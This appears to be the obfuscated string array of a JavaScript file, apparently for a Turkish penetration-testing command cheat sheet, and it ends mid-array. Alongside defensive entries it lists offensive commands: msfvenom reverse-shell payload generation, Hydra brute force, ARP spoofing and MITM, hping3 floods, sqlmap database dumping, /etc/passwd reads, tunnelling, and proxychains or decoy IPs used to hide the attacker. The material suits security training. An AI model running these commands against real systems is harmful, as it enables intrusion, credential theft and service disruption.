'Web\x20Sitesindeki\x20Gizli\x20Dizinleri\x20Bulma\x20(Gobuster)', 'ACADEMY_COMMANDS', 'Web\x20sunucusunun\x20TLS\x201.3\x20kullandığını\x20ve\x20sertifika\x20süresinin\x20dolmasına\x20kaç\x20gün\x20kaldığını\x20hesaplar.', 'Siber\x20testleriniz\x20için\x20hiyerarşik\x20klasör\x20yapısını\x20tek\x20seferde\x20oluşturur.', 'FTP\x20portunda\x20kullanıcı\x20adı\x20\x27anonymous\x27\x20ve\x20boş\x20parola\x20ile\x20içeri\x20girilip\x20girilemediğini\x20test\x20eder.', 'ssh-copy-id\x20-i\x20~/.ssh/id_rsa.pub\x20user@remote-server', 'HEDEFE\x20ÖZEL\x20SÖZLÜK', 'Belirlenen\x20kullanıcı\x20adı\x20ve\x20şifre\x20ikilisinin\x20web\x20arayüzünde\x20geçerli\x20olup\x20olmadığını\x20otomatik\x20kontrol\x20eder.', 'Hızlı\x20Paralel\x20Ağ\x20Giriş\x20Denetimi\x20(Medusa)', 'free\x20-m', 'ip\x20a', 'Elinizdeki\x20şifreli\x20metnin\x20MD5\x20mi,\x20SHA-256\x20mı,\x20bcrypt\x20mi\x20yoksa\x20NTLM\x20mi\x20olduğunu\x20saniyede\x20tespit\x20eder.', '3pUthvZ', 'Dünyanın\x20en\x20popüler\x20sızma\x20testi\x20çerçevesini\x20sessiz\x20modda\x20açar.', 'AÇIK\x20PORTLAR\x20&\x20PID', 'Birden\x20Fazla\x20Özel\x20Portun\x20Servis\x20Detayları\x20(nmap\x20-sV\x20-p\x20...)', 'grep\x20-i\x20\x27error\x27\x20/var/log/syslog', 'cve-search\x20-c\x20CVE-2021-44228', 'DURUM\x20FİLTRESİ', 'WordPress\x20Güvenlik\x20Açıklarını\x20Ayrıntılı\x20Tarama\x20(wpscan)', 'Çok\x20Yüksek\x20Hızlı\x20Asenkron\x20Web\x20Fuzzing\x20(FFuf)', 'Sistemin\x20kaç\x20MB\x20RAM\x20kullandığını\x20ve\x20bellek\x20taşması\x20riski\x20olup\x20olmadığını\x20anlık\x20gösterir.', 'Web\x20Sitesinin\x20Kullandığı\x20Altyapıyı\x20Deşifre\x20Etme\x20(WhatWeb)', 'MODEM\x20AÇIKLARI', 'DİNLEME\x20ÇERÇEVESİ', 'Sistemde\x20arka\x20planda\x20çalışan\x20tüm\x20uygulamaları,\x20CPU/RAM\x20tüketimlerini\x20ve\x20PID\x20kimliklerini\x20gösterir.', 'En\x20Yaygın\x20100\x20Portu\x20Hızlıca\x20Tarama\x20(nmap\x20-F)', 'HIZLI\x20KEŞİF', 'Dosyanın\x20mülkiyetini\x20kök\x20kullanıcıya\x20vererek\x20standart\x20kullanıcıların\x20değiştirmesini\x20engeller.', 'Nmap\x20ekibi\x20tarafından\x20geliştirilen\x20modern\x20paket\x20aracıyla\x20hem\x2080\x20hem\x20443\x27e\x20aynı\x20anda\x20SYN\x20gönderir.', 'Hedefe\x20Özel\x20ICMP\x20Echo\x20Paketi\x20Yollama\x20(hping3\x20-1)', 'Eksik\x20Güvenlik\x20Başlıklarını\x20Şablonla\x20Bulma\x20(Nuclei\x20Headers)', 'GÜVENLİK\x20GÜNLÜĞÜ', 'Ağ\x20Paketlerindeki\x20Resimleri\x20Yakalama\x20(Driftnet)', 'msfconsole\x20-q', 'Gömülü\x20Cihazlar\x20ve\x20Modem\x20Zafiyet\x20Çerçevesi\x20(Routersploit)', 'DNS\x20Portuna\x20Ham\x20UDP\x20Paketi\x20Enjeksiyonu\x20(hping3\x20-2)', 'nmap\x20-p\x2021\x20--script\x20ftp-anon\x20192.168.1.1', 'Yanlış\x20yazılan\x20ağ\x20paylaşım\x20isimlerine\x20cevap\x20vererek\x20istemcinin\x20NTLMv2\x20parola\x20özetini\x20toplar.', 'GÜVENLİK\x20BAŞLIKLARI', 'İç\x20Servisi\x20Dış\x20Portta\x20Yayınlama\x20(Chisel\x20Client)', 'API\x20Yetkilendirme\x20Başlığı\x20Fuzzing\x20(FFuf\x20-H)', 'DNS\x20(53),\x20DHCP\x20(67)\x20ve\x20SNMP\x20(161)\x20gibi\x20TCP\x20kullanmayan\x20UDP\x20tabanlı\x20kritik\x20servisleri\x20tarar.', 'WINDOWS\x20TCP\x20DİNLENENLER', 'SYN\x20COOKIES\x20SAVUNMASI', 'Şüpheli\x20IP\x20adresinden\x20gelen\x20tüm\x20paketleri\x20sunucuya\x20ulaşmadan\x20sessizce\x20çöpe\x20atar.', 'Derinlemesine\x20Dizin\x20Ağacı\x20Tarayıcı\x20(Feroxbuster)', 'hydra\x20-l\x20admin\x20-p\x20Sebu132009\x20192.168.1.1\x20http-get\x20/', 'ÖZEL\x20PARAMETRE', 'Güvenlik\x20Servisi\x20Loglarını\x20Canlı\x20Takip\x20Etme\x20(journalctl\x20-f)', 'nuclei\x20-u\x20http://127.0.0.1\x20-t\x20cves/', 'sudo\x20rkhunter\x20-c\x20--sk', 'sudo\x20nmap\x20-O\x20192.168.1.17', 'Yalnızca\x20web\x20proxy\x20veya\x20geliştirici\x20portu\x20olan\x208080\x27in\x20açık\x20olup\x20olmadığını\x20ve\x20servisin\x20yanıt\x20verip\x20vermediğini\x20test\x20eder.', '6.\x20Kimlik\x20&\x20Parola', 'GİZLİ\x20CİHAZ', 'HASH\x20PAROLA\x20KIRICI', 'journalctl\x20-u\x20lfl-defense\x20-f', 'DOSYA\x20BÜTÜNLÜĞÜ', 'chisel\x20client\x20127.0.0.1:8000\x20R:8080:127.0.0.1:80', 'Yalnızca\x20ilgilenilen\x20belirli\x20servis\x20portlarının\x20parmak\x20izini\x20çıkarır.', 'SSH\x20KAPATMA', '9rLIIiJ', 'Çok\x20Portlu\x20Ağ\x20Test\x20Paketi\x20Üreticisi\x20(nping)', 'Ping\x20Boğma\x20Simülasyonu\x20(hping3\x20--icmp\x20--flood)', 'Dış\x20dünyadan\x20sadece\x20güvenli\x20HTTPS\x20(443)\x20isteklerine\x20onay\x20verir.', 'UZANTI\x20TARAMASI', 'uname\x20-a', 'PROXY\x20ZİNCİRİ', 'TERMİNAL\x20WIRESHARK', 'Gizli\x20GET/POST\x20Parametrelerini\x20Keşfetme\x20(Arjun)', 'sudo\x20lsof\x20-i\x20:80', 'SSH\x20Sunucusunda\x20Güçsüz\x20Parola\x20Taraması\x20(Hydra\x20SSH)', 'CVE\x20VERİTABANI', '8.\x20Tünel\x20&\x20Pivot', 'Açık\x20olan\x20portun\x20arkasında\x20hangi\x20yazılımın\x20(örn:\x20Apache\x202.4.49\x20veya\x20Nginx\x201.18)\x20çalıştığını\x20öğrenir.', 'sudo\x20tcpdump\x20-i\x20eth0\x20\x22tcp[tcpflags]\x20&\x20(tcp-syn)\x20!=\x200\x22', 'DİSK\x20DOLULUĞU', 'whoami', 'sysctl\x20-w\x20net.ipv4.ip_forward=0', 'Sertifika\x20Geçerlilik\x20ve\x20Kripto\x20Protokol\x20Analizi\x20(Check-Certificate.ps1)', 'ZIP\x20Arşivinin\x20Parolasını\x20Denetleme\x20(fcrackzip)', 'Yüksek\x20Hızlı\x20RunspacePool\x20Asenkron\x20Port\x20Tarayıcı\x20(Port-Scan.ps1)', '888078jzprJD', 'ICMP\x20TESTİ', 'hashcat\x20-m\x201000\x20-a\x200\x20ntlm.txt\x20rockyou.txt', 'Yalnızca\x20200\x20OK\x20ve\x20301\x20Yönlendirmeleri\x20Gösterme\x20(FFuf\x20-mc)', 'ETTERCAP\x20ÇERÇEVESİ', 'Linux\x27taki\x20tüm\x20kayıtlı\x20yerel\x20hesapları,\x20varsayılan\x20kabuklarını\x20(bash,\x20nologin)\x20ve\x20ev\x20dizinlerini\x20listeler.\x20Şifreler\x20burada\x20tutulmaz.', 'nmap\x20--top-ports\x2020\x20127.0.0.1', 'Dünyanın\x20En\x20Çok\x20Saldırı\x20Alan\x2020\x20Portu\x20(nmap\x20--top-ports\x2020)', 'sublist3r\x20-d\x20lfl.local', 'msfvenom\x20-p\x20linux/x64/shell_reverse_tcp\x20LHOST=127.0.0.1\x20LPORT=4444\x20-f\x20elf\x20-o\x20rev.elf', '324120VnZowL', 'TCP\x20paketinde\x20aynı\x20anda\x20olmaması\x20gereken\x20bayrakları\x20yakarak\x20eski\x20tip\x20filtreleri\x20ve\x20işletim\x20sistemlerini\x20ayırt\x20eder.', 'Linux\x20çekirdeğinin\x20tam\x20sürümünü\x20gösterir.\x20Bilinen\x20Kernel\x20exploit\x20açıklarını\x20(Dirty\x20COW,\x20Dirty\x20Pipe\x20vb.)\x20tespit\x20etmek\x20için\x20ilk\x20bakılan\x20komuttur.', 'HTTP\x20Trafiğini\x20Canlı\x20İzleme\x20(tcpdump)', 'Otomatik\x20İşletim\x20Sistemi\x20Komut\x20Enjeksiyonu\x20Tespiti\x20(Commix)', 'Bulunan\x20Python\x20veya\x20C\x20dilindeki\x20exploit\x20kodunu\x20masaüstüne\x20kopyalar\x20ve\x20incelemenizi\x20sağlar.', 'SSL/TLS\x20SERTİFİKA\x20DENETİMİ', 'Windows\x20Uzak\x20Masaüstü\x20Giriş\x20Doğrulaması\x20(Hydra\x20RDP)', '443\x20HTTPS\x20portuna\x20TCP\x20düzeyinde\x20el\x20sıkışma\x20testi\x20göndererek\x20ağ\x20gecikmesini\x20ölçer.', 'Belirli\x20Portu\x20Tutan\x20İşlemi\x20Bulma\x20(lsof)', 'gobuster\x20dir\x20-u\x20http://127.0.0.1\x20-w\x20common.txt\x20-x\x20php,bak,zip,sql,txt', 'exploit', 'FIN,\x20URG\x20ve\x20PUSH\x20Bayraklı\x20Xmas\x20Paketi\x20(hping3\x20-F\x20-P\x20-U)', 'POST\x20İSTEK\x20ANALİZİ', 'İŞLEM\x20TAKİBİ', 'Strict-Transport-Security,\x20Content-Security-Policy,\x20X-Frame-Options\x20ve\x20nosniff\x20başlıklarını\x20doğrular;\x20eksik\x20varsa\x20risk\x20raporu\x20üretir.', 'Şu\x20An\x20Hangi\x20Kullanıcıyım?\x20(whoami)', 'Normalde\x20dışarı\x20kapalı\x20portları\x20HTTP/WebSocket\x20üzerinden\x20şifreli\x20tünel\x20ile\x20dışarı\x20aktarır.', 'sudo\x20nmap\x20-sU\x20-p\x2053,67,161\x20192.168.1.1', 'Zaman\x20kısıtlıyken\x20en\x20kritik\x20100\x20portu\x201\x20saniyeden\x20kısa\x20sürede\x20tarayarak\x20hızlı\x20durum\x20raporu\x20sunar.', 'tshark\x20-i\x201\x20-c\x2015', 'proxychains\x20nmap\x20-sT\x20-Pn\x2010.0.0.5', 'KLASİK\x20DİZİN\x20TARAYICI', 'Tarama\x20raporunu\x20daha\x20sonra\x20kurumsal\x20sızma\x20testi\x20belgesi\x20olarak\x20sunabilmek\x20için\x20bir\x20txt\x20dosyasına\x20kaydeder.', 'john\x20--format=Raw-MD5\x20hash.txt', 'pdfcrack\x20-f\x20confidential.pdf\x20-w\x20wordlist.txt', '3350190sIUOtF', 'SYN\x20BAYRAK\x20YAKALAMA', 'CHİSEL\x20İSTEMCİSİ', 'Hedef\x20web\x20sunucusunun\x20HSTS,\x20CSP\x20ve\x20X-Frame-Options\x20başlıklarını\x20döndürüp\x20döndürmediğini\x20kontrol\x20eder.', 'sudo\x20tcpdump\x20-i\x20any\x20-c\x2050\x20-w\x20capture.pcap', 'Şifrelenmemiş\x20HTTP\x20trafiğinden\x20geçen\x20tüm\x20resimleri\x20ve\x20grafikleri\x20anında\x20ekranda\x20gösterir.', 'Yerel\x20ağ\x20arayüzünde\x20dinleme\x20başlatır;\x20yetkisiz\x20şifresiz\x20HTTP/FTP\x20oturumlarını\x20tespit\x20etmek\x20için\x20kullanılır.', 'Servis\x20ve\x20Tam\x20Sürüm\x20Numarasını\x20Yakalama\x20(nmap\x20-sV)', 'Gizli\x20Dosyalar\x20ve\x20İzinlerle\x20Birlikte\x20Klasör\x20İçeriğini\x20Listeleme\x20(ls\x20-la)', 'Hangi\x20portların\x20açık,\x20hangi\x20IP\x27lerin\x20engelli\x20olduğunu\x20ayrıntılı\x20olarak\x20raporlar.', 'hydra\x20-L\x20users.txt\x20-P\x20passwords.txt\x20ssh://127.0.0.1\x20-t\x204', 'Python\x20Tabanlı\x20Kaba\x20Kuvvet\x20Aracı\x20(Patator)', 'KONUM\x20TESPİTİ', 'Tüm\x20tarayıcı\x20ve\x20ağ\x20trafiğinizi\x20şifreli\x20bir\x20SSH\x20sunucusu\x20üzerinden\x20geçiren\x20yerel\x20proxy\x20oluşturur.', 'sudo\x20ettercap\x20-T\x20-q\x20-i\x20eth0\x20//\x20//', '5.\x20MITM\x20&\x20Dinleme', 'SSH\x20Özel\x20Anahtarını\x20Yalnızca\x20Sahibine\x20Okunur\x20Kılma\x20(chmod\x20600)', 'Standart\x20ping\x20programından\x20farklı\x20olarak\x20paket\x20boyutunu\x20ve\x20sıklığını\x20kontrol\x20edebileceğiniz\x20ICMP\x20paketi\x20atar.', 'AĞ\x20AKIŞ\x20KAYDI', 'Netcat\x20ile\x20Uzak\x20Porta\x20Bağlanma\x20(nc\x20-nv)', 'ŞİFRELİ\x20ZIP\x20DOSYASI', 'sudo\x20hping3\x20-p\x2080\x20--tcp-timestamp\x20127.0.0.1\x20-c\x201', 'Netcat\x20ile\x20Dinleme\x20Portu\x20Açma\x20(nc\x20-lvnp)', 'Python\x20ile\x20Ham\x20Paket\x20İnşa\x20Etme\x20(Scapy)', 'SSH\x20PAROLA\x20LİSTESİ', 'Terminalde\x20hangi\x20yetkiyle\x20çalıştığınızı\x20gösterir.\x20Sistemde\x20normal\x20kullanıcı\x20mısınız\x20yoksa\x20en\x20yetkili\x20süper\x20kullanıcı\x20(root)\x20musunuz\x20hemen\x20söyler.', 'Kurulu\x20eklentilerdeki\x20bilinen\x20tüm\x20exploitleri\x20ve\x20SQLi\x20açıklarını\x20raporlar.', 'İŞLETİM\x20SİSTEMİ', 'Bozuk\x20Checksum\x20ile\x20IDS\x20Tespiti\x20(hping3\x20--badcksum)', 'Manuel\x20TCP\x20SYN\x20Paketiyle\x20Port\x20Açık\x20mı\x20Sorgulama\x20(hping3\x20-S)', 'WORDPRESS\x20EXPLOIT', 'SSH\x20portunun\x20(22)\x20bağlantı\x20kabul\x20etme\x20hızını\x20ve\x20TTL\x20paket\x20düşüşünü\x20test\x20eder.', 'hydra\x20-l\x20admin\x20-P\x20pass.txt\x20rdp://192.168.1.15', 'nmap\x20--script\x20vuln\x20192.168.1.1', 'SMB\x20ETERNALBLUE', 'SSH\x20KİMLİK\x20DOĞRULAMA', 'commix\x20--url=\x22http://127.0.0.1/ping.php?ip=127.0.0.1\x22', 'SYN\x20FLOOD', 'Sistemdeki\x20Tüm\x20Kullanıcı\x20Hesaplarını\x20Okuma\x20(cat\x20/etc/passwd)', 'Nmap\x20taramasını\x20veya\x20web\x20araçlarını\x20proxy\x20zincirinin\x20arkasından\x20geçirerek\x20IP\x20adresinizi\x20gizler.', 'nmap\x20-p\x20445\x20--script\x20smb-vuln-ms17-010\x20192.168.1.10', 'Dosyaya\x20herhangi\x20bir\x20arka\x20kapı\x20veya\x20virüs\x20eklenip\x20eklenmediğini\x20doğrulamak\x20için\x20hash\x20özetini\x20çıkarır.', 'SAHİPLİK\x20AYARI', 'KİMLİK\x20&\x20GRUPLAR', 'Linux\x20işletim\x20sistemindeki\x20tüm\x20kimlik\x20doğrulama,\x20hata\x20ve\x20ağ\x20günlüklerinin\x20saklandığı\x20kritik\x20log\x20dizinine\x20geçiş\x20yapar.', 'feroxbuster\x20-u\x20http://127.0.0.1', 'OTOMATİK\x20SQLI', 'FTP\x20dosya\x20sunucusunun\x20başarısız\x20giriş\x20sınırlandırması\x20(Fail2ban)\x20olup\x20olmadığını\x20test\x20eder.', 'searchsploit\x20-m\x2050383', 'Fidye\x20yazılımlarının\x20kullandığı\x20tarihi\x20Windows\x20dosya\x20paylaşım\x20açığının\x20hedefte\x20bulunup\x20bulunmadığını\x20test\x20eder.', 'ÇEKİRDEK\x20SÜRÜMÜ', 'ssh\x20-D\x201080\x20-q\x20-C\x20-N\x20user@remote-server', 'Windows\x20Active\x20Directory\x20ortamından\x20elde\x20edilen\x20NTLM\x20parola\x20özetlerini\x20test\x20eder.', 'TAM\x20DETAY', 'Otomatik\x20SQL\x20Enjeksiyonu\x20Tespiti\x20&\x20Veritabanı\x20Listeleme\x20(sqlmap)', 'Kullanıcı\x20ve\x20şifre\x20kelime\x20listeleri\x20kullanarak\x20SSH\x20portunda\x20varsayılan\x20veya\x20tahmin\x20edilebilir\x20parolaları\x20denetler.', 'WannaCry\x20/\x20MS17-010\x20SMB\x20Zafiyeti\x20Taraması\x20(smb-vuln-ms17-010)', 'wpscan\x20--url\x20http://127.0.0.1\x20--enumerate\x20u,vp', 'VERSİYON\x20TESPİTİ', 'Hedef\x20sitedeki\x20güncellenmemiş\x20güvensiz\x20WordPress\x20eklentilerini\x20ve\x20admin\x20kullanıcı\x20adlarını\x20listeler.', 'AĞ\x20ARAYÜZÜ', 'Fail2ban\x20Engellenen\x20Saldırgan\x20Listesi\x20(fail2ban-client)', 'Sızılan\x20hedef\x20sunucuyu\x20bir\x20yönlendiriciye\x20dönüştürerek\x20arka\x20taraftaki\x20kapalı\x20iç\x20ağlara\x20doğrudan\x20erişim\x20sağlar.', 'mitm', 'Metin\x20Modunda\x20Ortadaki\x20Adam\x20Simülasyonu\x20(Ettercap)', 'Araya\x2010\x20adet\x20rastgele\x20sahte\x20IP\x20serpiştirerek\x20hedef\x20güvenlik\x20duvarının\x20gerçek\x20saldırgan\x20IP\x27sini\x20tespit\x20etmesini\x20imkansızlaştırır.', 'SYN\x20Flood\x20Saldırılarına\x20Karşı\x20SYN\x20Cookies\x20Korumasını\x20Açma', 'Topluluk\x20tarafından\x20hazırlanan\x20YAML\x20şablonlarıyla\x20hedefteki\x20kritik\x20zafiyetleri\x20dakikalar\x20içinde\x20tespit\x20eder.', 'CVE\x20Kodunun\x20Detaylarını\x20ve\x20Risk\x20Puanını\x20Öğrenme\x20(cve-search)', 'Sistem\x20dosyalarının\x20değiştirilip\x20değiştirilmediğini\x20ve\x20gizli\x20trojanları\x20denetler.', 'Arama\x20motorlarından\x20ve\x20DNS\x20arşivlerinden\x20faydalanarak\x20dev.sirket.com\x20veya\x20test.sirket.com\x20gibi\x20gölge\x20alan\x20adlarını\x20keşfeder.', 'Tüm\x20Ağ\x20Bloğuna\x20Paralel\x20Hızlı\x20Ping\x20Taraması\x20(fping)', '32740qIGyQw', 'Windows\x20sunucuda\x20açık\x20olan\x20servisleri\x20ve\x20bağlanan\x20istemcilerin\x20IP\x20adreslerini\x20listeler.', 'ÇEKİRDEK\x20TABLOSU', 'Yakalanan\x20Trafiği\x20PCAP\x20Formatında\x20Dosyaya\x20Yazma\x20(tcpdump\x20-w)', 'Sadece\x20Sunucu\x20Başlıklarını\x20Hızlıca\x20Alma\x20(curl\x20-I)', 'Şirketin\x20Gizli\x20Alt\x20Alan\x20Adlarını\x20Bulma\x20(Sublist3r)', 'Stealth\x20SYN\x20Taraması\x20&\x20IDS\x20Atlatma\x20(nmap\x20-sS\x20-T2)', 'BAŞARISIZ\x20GİRİŞ\x20RAPORU', 'HAM\x20MD5\x20DENETİMİ', 'Hedef\x20güvenlik\x20duvarı\x20ping\x20paketlerini\x20engellese\x20bile\x20cihazın\x20açık\x20olduğunu\x20varsayarak\x20portları\x20tarar.', 'WHOIS\x20&\x20DNS\x20KEŞFİ', 'sudo\x20tcpdump\x20-i\x20eth0\x20-nn\x20-s0\x20-v\x20port\x2080', 'netstat\x20-antup', 'Windows\x20Olay\x20Günlüğü\x20Son\x2010\x20Güvenlik\x20Olayı\x20(Get-EventLog)', 'Şu\x20Anda\x20Hangi\x20Klasördeyim?\x20(pwd\x20-\x20Print\x20Working\x20Directory)', 'MODÜLER\x20KİMLİK\x20TESTİ', 'Saldırgan\x20Bir\x20IP\x20Adresini\x20Çekirdek\x20Düzeyinde\x20Engelleme\x20(iptables\x20DROP)', 'Gelen\x20Bağlantı\x20Taleplerini\x20Canlı\x20Takip\x20Etme\x20(tcpdump\x20SYN)', 'Güncel\x20CVE\x20Açıklarını\x20Şablonlarla\x20Tarama\x20(Nuclei)', 'ARP\x20Önbellek\x20Zehirleme\x20Simülasyonu\x20(arpspoof)', 'HTTP\x20başlığında\x20farklı\x20API\x20token\x20veya\x20yetkilendirme\x20parametrelerini\x20deneyerek\x20yetki\x20aşımını\x20test\x20eder.', 'tunnel', 'CANLI\x20SERVİS\x20GÜNLÜĞÜ', 'hping3\x20-1\x20127.0.0.1\x20-c\x203', 'sqlmap\x20-u\x20\x22http://127.0.0.1/api/search?q=test\x22\x20-D\x20master\x20--tables', 'whois\x20lostfromlight.com', 'Gidilen\x20Web\x20Sitelerini\x20Ekrana\x20Dökme\x20(Tshark\x20HTTP)', 'sudo\x20aureport\x20--auth', 'Kendi\x20bilgisayarınızın\x208080\x20portunu\x20güvenli\x20SSH\x20tüneli\x20üzerinden\x20uzak\x20sunucunun\x20web\x20servisine\x20bağlar.', 'powershell\x20\x22Test-NetConnection\x20-ComputerName\x20127.0.0.1\x20-Port\x20443\x22', 'Yeni\x20Güvenli\x20Çalışma\x20Dizinleri\x20Oluşturma\x20(mkdir\x20-p)', 'ANONİM\x20FTP', 'sudo\x20hping3\x20--icmp\x20--flood\x20127.0.0.1', 'Hata\x20sayfalarını\x20eleyerek\x20yalnızca\x20gizli\x20kalmış\x20parametreleri\x20ve\x20değişkenleri\x20ortaya\x20çıkarır.', 'df\x20-h', 'ŞİFRELİ\x20PDF\x20DOSYASI', 'TCP\x20SYN\x20Flood\x20Yük\x20Testi\x20(hping3\x20-S\x20--flood)', 'Veritabanındaki\x20Tabloları\x20Listeleme\x20(sqlmap\x20--tables)', 'Bilgisayardaki\x20Tüm\x2065,535\x20Portu\x20Tarama\x20(nmap\x20-p-)', 'SALDIRGAN\x20IP\x20ENGELLEME', 'GİZLİ\x20&\x20SESSİZ', 'DOSYA\x20LİSTELEME', 'Ekran\x20kartının\x20paralel\x20işlem\x20gücünü\x20kullanarak\x20saniyede\x20milyarlarca\x20parola\x20dener.', 'NSA\x20Kaynaklı\x20Tersine\x20Mühendislik\x20Çerçevesi\x20(Ghidra)', '3.\x20Web\x20&\x20Fuzzing', 'powershell\x20.\x5cCheck-Certificate.ps1', 'Rust\x20dilinde\x20yazılmış\x20modern\x20araç;\x20bulduğu\x20her\x20alt\x20dizinin\x20içine\x20otomatik\x20girerek\x20derinlemesine\x20tarama\x20yapar.', 'Linux\x20x64\x20Test\x20Yükü\x20(Payload)\x20Üretme\x20(msfvenom)', 'GÜVENLİ\x20DİZİN', 'ARP\x20ZEHİRLEME', 'sudo\x20ufw\x20status\x20verbose', 'Örneğin\x20Log4j\x20açığı\x20olan\x20CVE-2021-44228\x27in\x20CVSS\x20puanını\x20ve\x20etkilenen\x20sistemleri\x20listeler.', 'TEKNOLOJİ\x20PARMAK\x20İZİ', 'ffuf\x20-w\x20wordlist.txt\x20-u\x20http://127.0.0.1/api/profile\x20-H\x20\x22Authorization:\x20Bearer\x20FUZZ\x22', '404jMCrSk', 'PORT\x20TEPKİ\x20SÜRESİ', 'Hedef\x20web\x20sitesinde\x20HSTS,\x20CSP\x20veya\x20X-Frame-Options\x20eksikliklerini\x20otomatik\x20listeler.', 'Ağ\x20yönlendiricileri\x20ve\x20IP\x20kameralardaki\x20varsayılan\x20şifre\x20ve\x20donanım\x20açıklarını\x20denetler.', 'TERSİNE\x20MÜHENDİSLİK', 'Hedef\x20portlardaki\x20servisleri\x20Nmap\x27in\x20geniş\x20güvenlik\x20açığı\x20arşiviyle\x20karşılaştırarak\x20bilinen\x20CVE\x20açıklarını\x20listeler.', 'TERS\x20BAĞLANTI\x20(REVERSE\x20SHELL)', 'Dışarıdan\x20SSH\x20Girişlerini\x20Engelleme\x20(ufw\x20deny\x2022)', 'powershell\x20\x22Get-NetTCPConnection\x20-State\x20Listen\x22', '15b', 'crunch\x208\x208\x200123456789\x20-o\x20pins.txt', 'Log\x20Dosyasında\x20\x27error\x27\x20Kelimesini\x20Filtreleme\x20(grep)', 'SOCKS5\x20PROXY', 'whatweb\x20http://127.0.0.1', 'HTTP\x20URL\x20FİLTRESİ', 'hping3\x20-S\x20-p\x2022\x20127.0.0.1', 'Binlerce\x20satırlık\x20sistem\x20günlüğü\x20içinde\x20yalnızca\x20güvenlik\x20veya\x20çalışma\x20hatalarını\x20süzerek\x20ekrana\x20getirir.', 'HTTPS\x20İZNİ', 'ssh\x20-R\x209000:localhost:3000\x20user@remote-server', 'ffuf\x20-u\x20http://127.0.0.1/FUZZ\x20-w\x20/usr/share/wordlists/dirb/common.txt', '7.\x20Zafiyet\x20&\x20Exploit', 'PORT\x20BAĞLANTISI', 'SSH\x20UZAK\x20TÜNEL', 'gobuster\x20dir\x20-u\x20http://192.168.1.1\x20-w\x20/usr/share/wordlists/dirb/common.txt', 'Windows\x20NTLM\x20Parola\x20Özeti\x20Denetimi\x20(Hashcat\x20-m\x201000)', 'Ortak\x20kriptografik\x20anahtarınızı\x20uzak\x20sunucuya\x20yükleyerek\x20şifre\x20çalınma\x20riskini\x20ortadan\x20kaldırır.', 'Dünyaca\x20ünlü\x20Wireshark\x20aracının\x20terminal\x20sürümüdür;\x20GUI\x20olmadan\x20sunucularda\x20derin\x20paket\x20analizi\x20yapar.', 'İZİN\x20YÖNETİMİ', 'cat\x20/etc/passwd', 'NTLM\x20PAROLA', 'Tüm\x20Komutları\x20Tor\x20veya\x20Proxy\x20Üzerinden\x20Yürütme\x20(Proxychains)', 'Tarama\x20Sonuçlarını\x20Metin\x20Dosyasına\x20Kaydetme\x20(-oN)', 'ÇOK\x20PROTOKOLLÜ\x20TEST', 'TÜNEL\x20PİVOTING', 'powershell', 'UDP\x20PAKETİ', 'TÜM\x20PORTLAR', 'PORT\x20DİNLEYİCİ', 'sudo\x20fail2ban-client\x20status', '10746NDIjaj', 'PIN\x20KOMBİNASYONLARI', 'FTP\x20Sunucusunda\x20Kaba\x20Kuvvet\x20Testi\x20(Hydra\x20FTP)', 'chmod\x20600\x20id_rsa', 'TEKİL\x20PORT', 'Şirketin\x20web\x20sitesindeki\x20tüm\x20teknik\x20terimleri,\x20kurucu\x20isimlerini\x20ve\x20sloganları\x20çekerek\x20hedefe\x20özel\x20parola\x20sözlüğü\x20oluşturur.', 'SSH\x20ile\x20Yerel\x20Port\x20Tünelleme\x20(ssh\x20-L)', 'Ağ\x20kartından\x20geçen\x20paketleri\x20ham\x20olarak\x20yakalar\x20ve\x20ekranda\x20kaynak/hedef\x20IP\x20ile\x20birlikte\x20görüntüler.', 'ÖZEL\x20PAKET\x20MOTORU', 'sudo\x20scapy', 'hashid\x20\x22$6$5p0y...\x22', 'Uzaktan\x20kaba\x20kuvvet\x20parola\x20saldırılarını\x20önlemek\x20için\x20SSH\x20portunu\x20dış\x20dünyaya\x20kilitler.', 'nuclei\x20-u\x20http://127.0.0.1\x20-tags\x20headers', 'BAĞLANTI\x20DURUMU', 'arjun\x20-u\x20http://127.0.0.1/api/search', 'sudo\x20macchanger\x20-r\x20eth0', '5627556sRwlJY', 'ALT\x20ALAN\x20ADI', 'sudo\x20arpspoof\x20-i\x20eth0\x20-t\x20192.168.1.20\x20192.168.1.1', 'Modern\x20Ağ\x20Arayüzü\x20Tüneli\x20(Ligolo-ng)', 'nmap\x208080/tcp\x20127.0.0.1', 'Dosya\x20Sahipliğini\x20Güvenlik\x20Yöneticisine\x20Devretme\x20(chown\x20root:root)', 'Kablosuz\x20Ağ\x20Paketlerini\x20Havada\x20Dinleme\x20(Airodump-ng)', 'Yalnızca\x20Şifreli\x20Web\x20Trafiğine\x20İzin\x20Verme\x20(ufw\x20allow\x20443)', 'Hedef\x20Alan\x20Adı\x20Kayıt\x20ve\x20Sahiplik\x20Bilgisi\x20Sorgulama\x20(whois)', 'sudo\x20hping3\x20-S\x20-p\x2080\x20--flood\x20127.0.0.1', 'Netcat\x20ile\x20Sessiz\x20Port\x20Taraması\x20(nc\x20-z)', 'waybackurls\x20target.com', 'powershell\x20\x22Get-FileHash\x20-Algorithm\x20SHA256\x20.\x5cCyberBlog.dll\x22', 'ss\x20-tulpn', 'Sahte\x20kaynak\x20IP\x20adresleri\x20üreterek\x20güvenlik\x20duvarının\x20DDoS\x20savunma\x20mekanizmasını\x20(Rate\x20Limiting)\x20test\x20eder.', 'XSS\x20ANALİZİ', 'Zararlı\x20yazılımların\x20kaynak\x20kodunu\x20deşifre\x20etmek\x20ve\x20güvenlik\x20açıklarını\x20analiz\x20etmek\x20için\x20kullanılan\x20decompiler\x20yazılımıdır.', 'ROTA\x20İZLEME', 'Hydra\x20alternatifi\x20modüler\x20kimlik\x20denetleme\x20aracıyla\x20SSH\x20ve\x20Telnet\x20servislerini\x20test\x20eder.', 'Kablosuz\x20ağ\x20kartını\x20izleme\x20(monitor)\x20moduna\x20alarak\x20çevredeki\x20Wi-Fi\x20yayınlarını\x20listeler.', 'TRAFİKTEKİ\x20RESİMLER', 'Kendi\x20yerel\x20geliştirme\x20sunucunuzu\x20(localhost:3000)\x20dış\x20dünyaya\x20güvenle\x20açar.', 'MODERN\x20NPING', 'fcrackzip\x20-u\x20-D\x20-p\x20rockyou.txt\x20secret.zip', 'Web\x20uygulamasındaki\x20SQL\x20enjeksiyon\x20açıklarını\x20otomatik\x20sömürür\x20ve\x20sunucudaki\x20tüm\x20veritabanı\x20adlarını\x20listeler.', 'Bağlantıyı\x20tamamlamadan\x20(3-way\x20handshake\x20yapmadan)\x20sadece\x20kapıyı\x20tıklar\x20ve\x20paketleri\x20yavaş\x20göndererek\x20güvenlik\x20duvarlarından\x20gizlenir.', 